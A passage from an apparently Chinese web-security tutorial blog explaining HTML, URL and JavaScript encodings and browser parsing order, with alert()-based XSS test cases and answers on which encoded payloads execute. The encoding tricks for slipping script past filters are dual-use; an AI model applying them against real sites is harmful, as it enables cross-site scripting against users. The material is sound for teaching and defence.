id=实体编号>实体编号</h4><p>以<code>&</code>开头 + <code>#</code>符号以及字符的十进制数字，如<code>&lt;</code>的实体编号为<code>&amp;#60;</code>，字符都是有实体编号的但有些字符没有实体名称。</p><h3 id=javascript-encode>Javascript Encode</h3><ol><li>三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”</li><li>两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”</li><li>四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”</li><li>对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</li><li>jsfuck编码</li></ol><h3 id=css-encode>CSS Encode</h3><p>用一个反斜线<code>\</code>后面跟1~6位的十六进制数字，例如e可以编码为 \65 或 65 或 00065</p><h3 id=javascript-内置的编码函数>Javascript 内置的编码函数</h3><p>####String.fromCharCode</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=mi>97</span><span class=p>,</span><span class=mi>108</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>114</span><span class=p>,</span><span class=mi>116</span><span class=p>)</span>
</span></span></code></pre></div><p>这里是<code>alert</code>的编码</p><h2 id=render>Render</h2><p>这部分强烈推荐仔细阅读<a class=link href=https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html target=_blank rel=noopener>Deep dive into browser parsing and XSS payload encoding</a>，文章讲的很详细了，我这里浓缩一下。</p><h3 id=原理>原理</h3><p>览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。</p><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。</p><p>浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。</p><h3 id=三种状态>三种状态</h3><h4 id=数据状态中的字符引用>数据状态中的字符引用</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span><span class=p>&gt;</span><span class=ni>&amp;#60;</span>img src=x onerror=alert(4)<span class=ni>&amp;#62;</span><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>例如，在这个例子中，<code>&lt;</code>和<code>></code>字符被编码为<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p><p>当解析器解析完<code>&lt;div></code>并处于“数据状态”时，这两个字符将会被解析。当解析器遇到<code>&</code>字符，它会知道这是"数据状态的字符引用"，因此会消耗一个字符引用（例如<code>&amp;#60;</code>）并释放出对应字符的 token 。在这个例子中，对应字符指的是<code>&lt;</code>和<code>></code>。</p><p>你可能会想：这是不是意味着<code>&lt;</code>和<code>></code>的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到"标签开始状态"。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成"数据"。</p><h4 id=rcdata-状态中的字符引用>RCDATA 状态中的字符引用</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>textarea</span><span class=p>&gt;</span><span class=ni>&amp;#60;</span>script<span class=ni>&amp;#62;</span>alert(5)<span class=ni>&amp;#60;</span>/script<span class=ni>&amp;#62;</span><span class=p>&lt;/</span><span class=nt>textarea</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>这意味着在<code>&lt;textarea></code>和<code>&lt;title></code>标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”。这样就可以解释这段代码了。</p><p>另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入"RCDATA状态"。在这个状态中，如果遇到<code>&lt;</code>字符，它会转换到"RCDATA小于号状态"。如果<code>&lt;</code>字符后没有紧跟着<code>/</code>和对应的标签名，解析器会转换回"RCDATA状态"。这意味着在 RCDATA 元素标签的内容中（例如<code>&lt;textarea></code>或<code>&lt;title></code>的内容中），唯一能够被解析器认做是标签的就是<code>&lt;/textarea></code>或者<code>&lt;/title></code>。当然，这要看开始标签是哪一个。因此，在<code>&lt;textarea></code>和<code>&lt;title></code>的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题中的脚本不会被执行。</p><p>我们来迅速看一下 CDATA 元素。任何在 CDATA 元素中的内容将不会触发解析器创建开始标签。闭合 CDATA 元素的标志是<code>]]></code>序列。因此如果用户想逃出 CDATA 元素，就要用未经任何编码的<code>]]></code>序列，不然是不会逃出 CDATA 元素的。</p><h4 id=属性值状态中的字符引用>属性值状态中的字符引用</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span>
</span></span><span class=line><span class=cl><span class=na>href</span><span class=o>=</span><span class=s>&#34;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61
</span></span></span><span class=line><span class=cl><span class=s>%6c%65%72%74%28%32%29&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>在这个情况中字符引用会被解码。在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时， javascript 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 javascript 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题中的代码能够被执行。</p><h3 id=javascript-解析>Javascript 解析</h3><p>JavaScript解析过程与HTML解析过程有点不一样。</p><p>script 块有个有趣的属性：在块中的字符引用并不会被解析和解码。如果你去看“脚本数据状态”的状态转换规则，就会发现没有任何规则能转移到字符引用状态。所以如果攻击者尝试着将输入数据编码成字符实体并将其放在script 块中，它将不会被执行。</p><p>像<code>\uXXXX</code>（例如<code>\u0000</code>,<code>\u000A</code>）这样的字符，JavaScript 会视情况而定解析这些字符来执行。具体的说就是要看被编码的序列到底是哪部分。首先，像<code>\uXXXX</code>一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在3个部分：字符串中，标识符名称中和控制字符中。</p><h4 id=字符串中>字符串中</h4><p>当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p><h4 id=标识符名称中>标识符名称中</h4><p>当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。如果我们深入研究 JavaScript 细则，可以看到如下内容：</p><blockquote><p>​ Unicode转义序列（如\u000A\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将&rsquo;'符号前置在Unicode转义序列串（如\u000A000B000C）并不能作为标识符名称中的字符。将Unicode转义序列串放在标识符名称中是非法的。</p></blockquote><h4 id=控制字符>控制字符</h4><p>当用 Unicode 转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。如果你去看 ECMAScript 的语法，就会发现没有一处会用Unicode 转义序列来当作控制字符。例如，如果解析器正在解析一个函数调用语句，圆括号部分必须为<code>(</code>和<code>)</code>，而不能是<code>\u0028</code>和<code>\u0029</code>。</p><p>总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。</p><h3 id=example>Example</h3><h4 id=example-1>Example 1</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&#34;</span><span class=p>&gt;</span>test<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>这段代码可以被执行，首先经过 HTML 解析器，把 HTML 实体部分解析了，变成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:%61%6c%65%72%74%28%32%29&#34;</span><span class=p>&gt;</span>test<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>此时，由于 javascript 已经生成，不违反 URL 解析规则。所以，URL 解析正常。解析了 javascript ，最终进入 JS解析器。注意，URL 解析器还完成了 URL 解码工作。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:alert(2)&#34;</span><span class=p>&gt;</span>test<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>所以可以成功执行代码弹窗。</p><h4 id=example-2>Example 2</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>其中 URL 编码的是<code>javascript:alert(1)</code>，其实这段代码放到 html 当中并不会执行，URL解码之后 Javascript 解析器完成解码操作，讲道理脚本应该会正常执行啊，这里就有一个 URL 解析过程中的一个细节了，<strong>不能对协议类型进行任何的编码操作</strong>，否则 URL 解析器会认为它无类型，就导致这里被编码的<code>javascript</code>没有解码，当然不会被 URL 解析器识别了。</p><h4 id=example-3>Example 3</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;&#34;</span><span class=p>&gt;</span>test3<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>以上为对<code>&lt;a href="javascript:alert(3)">test3&lt;/a></code>先做 JS 编码，然后做URL编码，再做HTML编码共3层。</p><p>所以这里符合编码其实在首先经过 HTML 解析器解析之后变成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&#34;</span><span class=p>&gt;</span>test3<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>再经过 URL 解析器解析到了<code>javascript</code>，并解析后面的 url 编码变成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:\u0061\u006c\u0065\u0072\u0074(3)&#34;</span><span class=p>&gt;</span>test3<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>URL 解析器传给 JS 解析器解析 javascript 代码，正常解析得到弹窗</p><h4 id=example-4>Example 4</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>onclick</span><span class=o>=</span><span class=s>&#34;window.open(&#39;value1&#39;)&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:window.open(&#39;value2&#39;)&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><code>value1</code>处，先经过 HTML 解码，然后经过 javascript 解码，最后经过 url 解码</p><p><code>value2</code>处则是先经过 HTML 解码，然后经过 url 解码，接着 javascript 解码，最后经过 url 解码</p><h4 id=example-5>Example 5</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=err>&amp;#</span><span class=na>x3d</span><span class=err>;&#34;</span><span class=na>http:</span><span class=err>//</span><span class=na>www</span><span class=err>.</span><span class=na>example</span><span class=err>.</span><span class=na>com</span><span class=err>&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>s</span><span class=err>&amp;#</span><span class=na>x72</span><span class=err>;</span><span class=na>c</span><span class=o>=</span><span class=s>&#34;http://www.example.com&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>这里都不会加载图片，因为参考我们上面讲的三种状态，这里实体编码存在的地方并不属于任何一种状态，所以并不会被解码。</p><h3 id=examples>Examples</h3><ol><li><p><code>&lt;a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29">&lt;/a></code>
URL encoded &ldquo;javascript:alert(1)&rdquo;</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: URL 解析器解析之后不会再掉用 js 解析器解析，所以不会使用 js 伪协议</p></li><li><p><code>&lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61 %6c%65%72%74%28%32%29"></code></p><p>Character entity encoded &ldquo;javascript&rdquo; and URL encoded &ldquo;alert(2)&rdquo;</p><p>Answer: The javascript will execute.</p><p>Explanation: 首先用 HTML 解析器解析实体字符，再用 URL 解析器解析，并调用 js 解析器进行 js 伪协议解析</p></li><li><p><code>&lt;a href="javascript%3aalert(3)">&lt;/a></code></p><p>URL encoded &ldquo;:&rdquo;</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: URL 解析器解析之后并不会识别 js 伪协议</p></li><li><p><code>&lt;div>&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div></code></p><p>Character entity encoded &lt; and ></p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 参照 #数据状态中的字符引用</p></li><li><p><code>&lt;textarea>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea></code></p><p>Character entity encoded &lt; and ></p><p>Answer: The javascript will NOT execute AND the character entities will NOT
be decoded either</p><p>Explanation: 参照 #RCDATA 状态中的字符引用</p></li><li><p><code>&lt;textarea>&lt;script>alert(6)&lt;/script>&lt;/textarea></code></p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 参照 #RCDATA 状态中的字符引用</p></li><li><p><code>&lt;button onclick="confirm('7&amp;#39;);">Button&lt;/button></code></p><p>Character entity encoded '</p><p>Answer: The javascript will execute.</p><p>Explanation: 属于属性值状态中的字符引用，会在 HTML 解析器中首先被解析成<code>'</code>，闭合了单引号，得到执行</p></li><li><p><code>&lt;button onclick="confirm('8\u0027);">Button&lt;/button></code></p><p>Unicode escape sequence encoded '</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 存在字符串中，不会被解析成<code>'</code></p></li><li><p><code>&lt;script>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&#116&amp;#40;&amp;#57;&amp;#41;&#59&lt;/script></code></p><p>Character entity encoded alert(9);</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 由 js 解析器解析，并不会交由 HTML 解析器解析，所以不识别，不执行</p></li><li><p><code>&lt;script>\u0061\u006c\u0065\u0072\u0074(10);&lt;/script></code></p></li></ol><p>Unicode Escape sequence encoded alert</p><p>Answer: The javascript will execute.</p><p>Explanation: 由 js 解析器解析，属于 js 的编码，可以直接执行</p><ol start=11><li><p><code>&lt;script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script></code></p><p>Unicode Escape sequence encoded alert(11)</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 由 js 解析器解析，属于 js 的编码，但是编码了<code>(</code>、<code>)</code>，而这两个属于控制字符，不会被正常解析</p></li><li><p><code>&lt;script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script></code></p><p>Unicode Escape sequence encoded alert and 12</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 要么是因为<code>\u0031\u0032</code>不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。</p></li><li><p><code>&lt;script>alert('13\u0027)&lt;/script></code></p><p>Unicode escape sequence encoded '</p><p>Answer: The javascript will NOT execute.</p><p>Explanation: 在字符串中，被解析成字符串</p></li><li><p><code>&lt;script>alert('14\u000a')&lt;/script></code></p><p>Unicode escape sequence encoded line feed.</p><p>Answer: The javascript will execute.</p><p>Explanation: <code>\u000a</code>会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。</p></li><li><p><code>&lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;">&lt;/a></code></p><p>Answer: The javascript will execute.</p><p>Explanation: 参照 Example 3</p></li></ol><h2 id=reference>Reference</h2><p><a class=link href=https://imweb.io/topic/55e3c132771670e207a16bcf target=_blank rel=noopener>mXSS简述</a></p><p><a class=link href=https://security.yirendai.com/news/share/26 target=_blank rel=noopener>浅谈XSS—字符编码和浏览器解析原理</a></p><p><a class=link href=http://momomoxiaoxi.com/2017/10/10/XSS/ target=_blank rel=noopener>XSS测试备忘录</a></p><p><a class=link href=https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html target=_blank rel=noopener>Deep dive into browser parsing and XSS payload encoding</a></p><p><a class=link href=https://juejin.im/entry/59e1d31f51882578c3411c77 target=_blank rel=noopener>浏览器的渲染：过程与原理</a></p><p><a class=link href=https://xz.aliyun.com/t/2936 target=_blank rel=noopener>XSS小结</a></p><p><a class=link href=https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29 target=_blank rel=noopener>Cross-site Scripting (XSS)</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/Sec/>Sec</a>
<a href=/tags/XSS/>XSS</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2019/03/14/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-IV/><div class=article-details><h2 class=article-title>Web安全从零开始 XSS IV</h2></div></a></article><article><a href=/2019/03/14/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-III/><div class=article-details><h2 class=article-title>Web安全从零开始 XSS III</h2></div></a></article><article><a href=/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-II/><div class=article-details><h2 class=article-title>Web安全从零开始-XSS II</h2></div></a></article><article><a href=/2019/03/08/Web-For-Pentest/><div class=article-details><h2 class=article-title>Web For Pentest</h2></div></a></article><article><a href=/2021/04/20/tls-poison/><div class=article-details><h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#what-is-xss>What is XSS</a><ol><li><a href=#概述>概述</a></li><li><a href=#成因>成因</a></li><li><a href=#危害>危害</a></li><li><a href=#易产生xss的地方>易产生XSS的地方</a></li></ol></li><li><a href=#kinds-of-xss>Kinds of XSS</a><ol><li><a href=#reflected-xss-attacks>Reflected XSS Attacks</a><ol><li><a href=#介绍>介绍</a></li><li><a href=#常见注入点>常见注入点</a></li><li><a href=#攻击方式>攻击方式</a></li></ol></li><li><a href=#dom-based-xss-attacks>Dom Based XSS Attacks</a><ol><li><a href=#介绍-1>介绍</a></li><li><a href=#注入点>注入点</a></li><li><a href=#攻击方式-1>攻击方式</a></li></ol></li><li><a href=#stored-xss-attacks>Stored XSS Attacks</a><ol><li><a href=#介绍-2>介绍</a></li><li><a href=#常见注入点-1>常见注入点</a></li><li><a href=#攻击方式-2>攻击方式</a></li></ol></li><li><a href=#mxss-attacks>MXSS Attacks</a><ol><li><a href=#介绍-3>介绍</a></li><li><a href=#常见注入点-2>常见注入点</a></li></ol></li><li><a href=#uxss>UXSS</a><ol><li><a href=#介绍-4>介绍</a></li></ol></li></ol></li><li><a href=#payload>Payload</a><ol><li><a href=#img>img</a></li><li><a href=#a>a</a></li><li><a href=#input>input</a></li><li><a href=#form>form</a></li><li><a href=#iframe>iframe</a></li><li><a href=#svg>svg</a></li><li><a href=#sth-else>sth else</a></li></ol></li><li><a href=#encode>Encode</a><ol><li><a href=#five-kinds-of-html-elements>Five Kinds Of HTML Elements</a></li><li><a 